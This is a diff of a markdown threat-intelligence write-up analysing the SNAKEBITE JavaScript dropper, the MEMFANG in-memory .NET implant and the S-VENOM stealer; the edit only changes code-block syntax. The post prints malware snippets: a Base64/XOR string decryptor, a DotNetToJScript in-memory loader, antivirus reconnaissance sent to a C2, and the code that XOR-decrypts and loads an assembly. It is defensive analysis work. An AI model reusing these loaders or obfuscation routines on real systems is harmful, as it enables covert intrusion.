@@ -21,7 +21,7 @@ SNAKEBITE is a JavaScript based dropper that is not unique in nature, rather it 
 
 Majority of the code in SNAKEBITE is obscured and encrypted via customized encryption. The decryption sequence consists of Base64 decode followed by XOR - the key for which is calculated at the time of execution. Primarily, an embedded phrase is decoded using Base64 and XORed with another embedded string. The resulting key is stored in the variable “keeee” and is used as the XOR decryption key for the rest of the payload. The aforementioned sequence is continued for every encrypted string which ultimately unravels the assembly payload embedded within the script.
 
-{% highlight javascript %}
+```{javascript}
 function qdeH(str) {
 	var b64 = "qfU3vnNPFuaV8WcilGXYm0Rg2ASLM1HIkjKxJhwd7OZy6toz5Eep4rDbsTBQC9+/=";
 	var b, result = "",
@@ -53,13 +53,14 @@ function PMKDTYDd(bsix){
 	return QeTPECI(keeee,qdeH(bsix))
 }
 var keeee = QeTPECI("dDsB",qdeH("mdn"+"n1n"+"Wbl"+"Pu1"));
-{% endhighlight %}
+```
+
 <p style="text-align: center;">The Base64 and XOR decryption sequence</p>
 
 
 SNAKEBITE features a modified build of Starfighters (an in-memory launcher that has also been included in the Koadic framework as an implant) which seeks to deploy the MEMFANG implant directly into memory. The modified payload is a .NET assembly converted to javascript using [DotNetToJScript](https://github.com/tyranid/DotNetToJScript).
 
-{% highlight javascript %}
+```{javascript}
 var dash = "";
 var enc = new ActiveXObject("System.Text.ASCIIEncoding");
 var length = enc["GetByteCount_2"](b);
@@ -79,7 +80,8 @@ var al = new ActiveXObject("System.Collections.ArrayList");
 var d = fmt["Deserialize_2"](dash);
 al.Add(undefined);
 var o = d["DynamicInvoke"](al.ToArray())["CreateInstance"](ec);
-{% endhighlight %}
+```
+
 <p style="text-align: center;">Deobfuscated Starfighters snippet from a variant of SNAKEBITE</p>
 
 Starfighters implementation in SNAKEBITE requires setting the .NET version before execution which is achieved by checking for the subfolders in .NET installation directory using _FSO.GetFolder(FSO.GetSpecialFolder(0)+"\Microsoft.NET\Framework\").SubFolders;_. Once the .NET version is set, information regarding the installed Antivirus product is collected by querying the WMI service and later sent to the C2 server.  
@@ -87,7 +89,7 @@ Starfighters implementation in SNAKEBITE requires setting the .NET version befor
 _var objWMIService = GetObject("winmgmts:\\.\root\SecurityCenter2");_  
 _var colItems = objWMIService.ExecQuery("Select * From AntiVirusProduct", null, 48);_  
 
-{% highlight javascript %}
+```{javascript}
 var shells = new ActiveXObject("WScript.Shell");
 function MfNZUM(){
     var net = "";
@@ -140,7 +142,7 @@ finally{window.close();}
 }
 catch (e) {}
 finally{window.close();}
-{% endhighlight %}
+```
 
 ## MEMFANG
 
@@ -148,7 +150,7 @@ MEMFANG is a .NET implant that is embedded inside SNAKEBITE and deployed directl
 
 The decryption mechanism utilizes the first 32 bytes of the data in the .tmp file to perform a byte-wise XOR. This results in the decrypted assembly stored in “array2” which is then loaded and executed in memory.
 
-{% highlight javascript %}
+```{javascript}
 static Program()
 {
 	byte[] array = File.ReadAllBytes(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "LwBFLmM.tmp".Trim()));
@@ -162,7 +164,7 @@ static Program()
 	}
 	Program._assembly = Assembly.Load(array2);
 }
-{% endhighlight %}
+```
 
 ## S-VENOM
 
@@ -174,7 +176,7 @@ Following information is collected by the S-VENOM post-intrusion:
 
 S-VENOM traverses over the registry key, _‘Software\Microsoft\Windows\CurrentVersion\Uninstall’_, to find all installed applications on the system with a valid uninstallation path.
 
-{% highlight javascript %}
+```{javascript}
 using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall"))
 {
     foreach (string name in registryKey.GetSubKeyNames())
@@ -196,13 +198,13 @@ if (text != null)
 	}
        }
 }
-{% endhighlight %}
+```
 
 ### Identify Security Solutions
 
 Using the Windows Management Instrumentation (WMI) framework, S-VENOM attempts to enumerate all operating Antivirus and Antispyware products on the system.
 
-{% highlight javascript %}
+```{javascript}
 jsonWriter.WritePropertyName("antiVirusProduct");
 SysInfo.WriteWmi(jsonWriter, "antiVirusProduct", "root\\SecurityCenter2", new string[]
 {
@@ -217,7 +219,7 @@ SysInfo.WriteWmi(jsonWriter, "antiSpywareProduct", "root\\SecurityCenter2", new 
 	"ProductState",
 	"TimeStamp"
 });
-{% endhighlight %}
+```
 
 ### Retrieve Access Tokens
 
